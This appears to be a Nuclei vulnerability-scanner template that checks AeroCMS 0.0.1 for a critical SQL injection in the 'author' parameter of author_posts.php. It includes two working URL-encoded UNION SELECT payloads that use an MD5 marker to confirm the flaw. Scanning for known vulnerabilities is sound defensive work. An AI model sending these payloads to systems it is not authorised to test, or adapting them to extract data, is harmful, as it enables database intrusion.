id: aerocms-sqli
info:
  author: shivampand3y
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
  description: 'AeroCMS 0.0.1 contains a SQL injection vulnerability via the author
    parameter. An attacker can possibly obtain sensitive information, modify data,
    and/or execute unauthorized administrative operations in the context of the affected
    site.

    '
  metadata:
    verified: true
  name: AeroCMS 0.0.1 - SQL Injection
  reference:
  - https://www.exploit-db.com/exploits/51022
  - https://github.com/MegaTKC/AeroCMS/releases/tag/v0.0.1
  severity: high
  tags: aero,cms,sqli,edb
requests:
- matchers:
  - part: body
    type: word
    words:
    - '{{md5(num)}}'
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/author_posts.php?author=admin%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5({{num}}),1,1),NULL,NULL,NULL,NULL--%20-&p_id=1'
  - '{{BaseURL}}/cms/author_posts.php?author=admin%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5({{num}}),1,1),NULL,NULL,NULL,NULL--%20-&p_id=1'
  stop-at-first-match: true
variables:
  num: '999999999'
